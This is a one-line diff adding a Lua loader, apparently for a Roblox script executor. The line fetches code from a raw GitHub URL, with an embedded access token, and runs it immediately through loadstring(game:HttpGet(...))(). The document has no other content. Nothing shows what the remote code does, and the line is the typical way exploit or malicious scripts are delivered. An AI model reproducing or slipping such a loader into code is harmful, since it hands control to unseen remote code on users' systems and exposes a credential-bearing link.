@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/sa/main/%D0%A1Ode?token=GHSAT0AAAAAABX632UFTF6DA4POAWY5IDM2YYGAMWA", true))()
